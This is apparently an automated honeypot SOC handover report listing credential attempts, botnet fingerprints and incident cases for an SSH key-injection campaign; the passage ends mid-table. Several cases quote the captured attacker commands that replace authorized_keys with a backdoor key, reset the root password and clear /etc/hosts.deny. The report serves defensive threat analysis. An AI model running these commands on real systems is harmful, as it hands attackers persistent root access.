# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-08 |
| **Generated At** | 2026-06-08T21:53:21Z |
| **Shift Time** | 21:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **304** |
| Confirmed Threats | **254** |
| False Positives Filtered | **50** (16.4%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **10** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **276** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **80** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **37** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 13 |
| `ubuntu` | 2 |
| `user` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `123456` | 9 |
| `123` | 3 |
| `1234` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `ankur` | `1234` | 1 |
| `testuser` | `testuser` | 1 |
| `sandro` | `sandro` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `welcome@2026` | `120.48.77.176` | 2026-06-08T20:21:42 |
| `root` | `Qwer@1234` | `35.222.117.243` | 2026-06-08T20:22:30 |
| `root` | `3245gs5662d34` | `35.222.117.243` | 2026-06-08T20:22:37 |
| `root` | `fckgwrhqq2` | `35.222.117.243` | 2026-06-08T20:26:29 |
| `root` | `zzidc2025` | `35.222.117.243` | 2026-06-08T20:27:45 |
| `root` | `!@#$QWER` | `35.222.117.243` | 2026-06-08T20:29:03 |
| `root` | `jyb-2024` | `35.222.117.243` | 2026-06-08T20:32:49 |
| `root` | `Qq@12345678` | `120.48.77.176` | 2026-06-08T20:33:18 |
| `root` | `3245gs5662d34` | `120.48.77.176` | 2026-06-08T20:33:29 |
| `root` | `Zn123456!` | `35.222.117.243` | 2026-06-08T20:35:25 |
| `root` | `dev2025` | `35.222.117.243` | 2026-06-08T20:41:27 |
| `root` | `Sw123123` | `35.222.117.243` | 2026-06-08T20:45:02 |
| `root` | `casa` | `35.222.117.243` | 2026-06-08T20:47:28 |
| `root` | `P@$$W0rd123` | `120.48.77.176` | 2026-06-08T20:51:07 |
| `root` | `zxcv123456` | `35.222.117.243` | 2026-06-08T20:51:12 |
| `root` | `Master@123` | `35.222.117.243` | 2026-06-08T20:56:05 |
| `root` | `admin` | `192.42.116.68` | 2026-06-08T20:57:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **304** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 86 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 52 | 1 |
| `f555226df196...` | Mirai/variant | 29 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 52 | 1 | libssh-based |
| `f555226df196...` | libssh | 29 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:s4i8UjgXldvS"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.77.176`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.77.176`, `35.222.117.243`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **21** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS142403` | YISU CLOUD LTD | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS27951` | Media Commerce Partners S.A | 1 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS60558` | PHOENIX NAP, LLC. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d233df327991

| Field | Detail |
|---|---|
| **Source IP** | `120.48.77[.]176` |
| **First Seen** | 2026-06-08 20:21 |
| **Last Seen** | 2026-06-08 20:22 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:s4i8UjgXldvS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:21:40` | `cowrie.session.connect` |
| `2026-06-08 20:21:41` | `cowrie.client.version` |
| `2026-06-08 20:21:41` | `cowrie.client.kex` |
| `2026-06-08 20:21:42` | `cowrie.login.success` |
| `2026-06-08 20:21:43` | `cowrie.session.params` |
| `2026-06-08 20:21:43` | `cowrie.command.input` |
| `2026-06-08 20:21:43` | `cowrie.command.failed` |
| `2026-06-08 20:21:43` | `cowrie.log.closed` |
| `2026-06-08 20:21:44` | `cowrie.session.params` |
| `2026-06-08 20:21:44` | `cowrie.command.input` |
| `2026-06-08 20:21:45` | `cowrie.session.file_download` |
| `2026-06-08 20:21:45` | `cowrie.log.closed` |
| `2026-06-08 20:21:57` | `cowrie.session.params` |
| `2026-06-08 20:21:57` | `cowrie.command.input` |
| `2026-06-08 20:21:58` | `cowrie.log.closed` |
| `2026-06-08 20:21:58` | `cowrie.session.params` |
| `2026-06-08 20:21:58` | `cowrie.command.input` |
| `2026-06-08 20:21:58` | `cowrie.log.closed` |
| `2026-06-08 20:21:59` | `cowrie.session.params` |
| `2026-06-08 20:21:59` | `cowrie.command.input` |
| `2026-06-08 20:21:59` | `cowrie.session.file_download` |
| `2026-06-08 20:21:59` | `cowrie.log.closed` |
| `2026-06-08 20:21:59` | `cowrie.session.params` |
| `2026-06-08 20:21:59` | `cowrie.command.input` |
| `2026-06-08 20:22:00` | `cowrie.log.closed` |
| `2026-06-08 20:22:00` | `cowrie.session.params` |
| `2026-06-08 20:22:00` | `cowrie.command.input` |
| `2026-06-08 20:22:00` | `cowrie.log.closed` |
| `2026-06-08 20:22:00` | `cowrie.session.params` |
| `2026-06-08 20:22:00` | `cowrie.command.input` |
| `2026-06-08 20:22:00` | `cowrie.command.input` |
| `2026-06-08 20:22:01` | `cowrie.log.closed` |
| `2026-06-08 20:22:02` | `cowrie.session.params` |
| `2026-06-08 20:22:02` | `cowrie.command.input` |
| `2026-06-08 20:22:02` | `cowrie.log.closed` |
| `2026-06-08 20:22:03` | `cowrie.session.params` |
| `2026-06-08 20:22:03` | `cowrie.command.input` |
| `2026-06-08 20:22:03` | `cowrie.log.closed` |
| `2026-06-08 20:22:03` | `cowrie.session.params` |
| `2026-06-08 20:22:03` | `cowrie.command.input` |
| `2026-06-08 20:22:04` | `cowrie.log.closed` |
| `2026-06-08 20:22:04` | `cowrie.session.params` |
| `2026-06-08 20:22:04` | `cowrie.command.input` |
| `2026-06-08 20:22:05` | `cowrie.log.closed` |
| `2026-06-08 20:22:05` | `cowrie.session.params` |
| `2026-06-08 20:22:05` | `cowrie.command.input` |
| `2026-06-08 20:22:06` | `cowrie.log.closed` |
| `2026-06-08 20:22:07` | `cowrie.session.params` |
| `2026-06-08 20:22:07` | `cowrie.command.input` |
| `2026-06-08 20:22:08` | `cowrie.log.closed` |
| `2026-06-08 20:22:08` | `cowrie.session.params` |
| `2026-06-08 20:22:08` | `cowrie.command.input` |
| `2026-06-08 20:22:09` | `cowrie.log.closed` |
| `2026-06-08 20:22:09` | `cowrie.session.params` |
| `2026-06-08 20:22:09` | `cowrie.command.input` |
| `2026-06-08 20:22:10` | `cowrie.log.closed` |
| `2026-06-08 20:22:10` | `cowrie.session.params` |
| `2026-06-08 20:22:10` | `cowrie.command.input` |
| `2026-06-08 20:22:10` | `cowrie.log.closed` |
| `2026-06-08 20:22:11` | `cowrie.session.params` |
| `2026-06-08 20:22:11` | `cowrie.command.input` |
| `2026-06-08 20:22:11` | `cowrie.log.closed` |
| `2026-06-08 20:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.77[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.48.77[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3850ce02c99

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:22 |
| **Last Seen** | 2026-06-08 20:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:22:29` | `cowrie.session.connect` |
| `2026-06-08 20:22:29` | `cowrie.client.version` |
| `2026-06-08 20:22:29` | `cowrie.client.kex` |
| `2026-06-08 20:22:30` | `cowrie.login.success` |
| `2026-06-08 20:22:31` | `cowrie.session.params` |
| `2026-06-08 20:22:31` | `cowrie.command.input` |
| `2026-06-08 20:22:31` | `cowrie.command.failed` |
| `2026-06-08 20:22:31` | `cowrie.log.closed` |
| `2026-06-08 20:22:32` | `cowrie.session.params` |
| `2026-06-08 20:22:32` | `cowrie.command.input` |
| `2026-06-08 20:22:32` | `cowrie.session.file_download` |
| `2026-06-08 20:22:32` | `cowrie.log.closed` |
| `2026-06-08 20:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6058d884913

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:22 |
| **Last Seen** | 2026-06-08 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:22:36` | `cowrie.session.connect` |
| `2026-06-08 20:22:36` | `cowrie.client.version` |
| `2026-06-08 20:22:36` | `cowrie.client.kex` |
| `2026-06-08 20:22:37` | `cowrie.login.success` |
| `2026-06-08 20:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd037dadbad7

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:26 |
| **Last Seen** | 2026-06-08 20:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:26:27` | `cowrie.session.connect` |
| `2026-06-08 20:26:27` | `cowrie.client.version` |
| `2026-06-08 20:26:28` | `cowrie.client.kex` |
| `2026-06-08 20:26:29` | `cowrie.login.success` |
| `2026-06-08 20:26:29` | `cowrie.session.params` |
| `2026-06-08 20:26:29` | `cowrie.command.input` |
| `2026-06-08 20:26:29` | `cowrie.command.failed` |
| `2026-06-08 20:26:30` | `cowrie.log.closed` |
| `2026-06-08 20:26:30` | `cowrie.session.params` |
| `2026-06-08 20:26:30` | `cowrie.command.input` |
| `2026-06-08 20:26:31` | `cowrie.session.file_download` |
| `2026-06-08 20:26:31` | `cowrie.log.closed` |
| `2026-06-08 20:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def2b07cbe6d

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:26 |
| **Last Seen** | 2026-06-08 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:26:34` | `cowrie.session.connect` |
| `2026-06-08 20:26:34` | `cowrie.client.version` |
| `2026-06-08 20:26:34` | `cowrie.client.kex` |
| `2026-06-08 20:26:35` | `cowrie.login.success` |
| `2026-06-08 20:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0194065a3548

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:27 |
| **Last Seen** | 2026-06-08 20:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:27:44` | `cowrie.session.connect` |
| `2026-06-08 20:27:44` | `cowrie.client.version` |
| `2026-06-08 20:27:44` | `cowrie.client.kex` |
| `2026-06-08 20:27:45` | `cowrie.login.success` |
| `2026-06-08 20:27:46` | `cowrie.session.params` |
| `2026-06-08 20:27:46` | `cowrie.command.input` |
| `2026-06-08 20:27:46` | `cowrie.command.failed` |
| `2026-06-08 20:27:46` | `cowrie.log.closed` |
| `2026-06-08 20:27:46` | `cowrie.session.params` |
| `2026-06-08 20:27:46` | `cowrie.command.input` |
| `2026-06-08 20:27:47` | `cowrie.session.file_download` |
| `2026-06-08 20:27:47` | `cowrie.log.closed` |
| `2026-06-08 20:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8c7d5db92b

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:27 |
| **Last Seen** | 2026-06-08 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:27:50` | `cowrie.session.connect` |
| `2026-06-08 20:27:50` | `cowrie.client.version` |
| `2026-06-08 20:27:50` | `cowrie.client.kex` |
| `2026-06-08 20:27:51` | `cowrie.login.success` |
| `2026-06-08 20:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-151b400f3fdb

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:29 |
| **Last Seen** | 2026-06-08 20:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:29:02` | `cowrie.session.connect` |
| `2026-06-08 20:29:02` | `cowrie.client.version` |
| `2026-06-08 20:29:02` | `cowrie.client.kex` |
| `2026-06-08 20:29:03` | `cowrie.login.success` |
| `2026-06-08 20:29:04` | `cowrie.session.params` |
| `2026-06-08 20:29:04` | `cowrie.command.input` |
| `2026-06-08 20:29:04` | `cowrie.command.failed` |
| `2026-06-08 20:29:05` | `cowrie.log.closed` |
| `2026-06-08 20:29:05` | `cowrie.session.params` |
| `2026-06-08 20:29:05` | `cowrie.command.input` |
| `2026-06-08 20:29:05` | `cowrie.session.file_download` |
| `2026-06-08 20:29:05` | `cowrie.log.closed` |
| `2026-06-08 20:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdff512cb09b

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:29 |
| **Last Seen** | 2026-06-08 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:29:08` | `cowrie.session.connect` |
| `2026-06-08 20:29:08` | `cowrie.client.version` |
| `2026-06-08 20:29:08` | `cowrie.client.kex` |
| `2026-06-08 20:29:09` | `cowrie.login.success` |
| `2026-06-08 20:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c18fd28f42e

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:32 |
| **Last Seen** | 2026-06-08 20:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
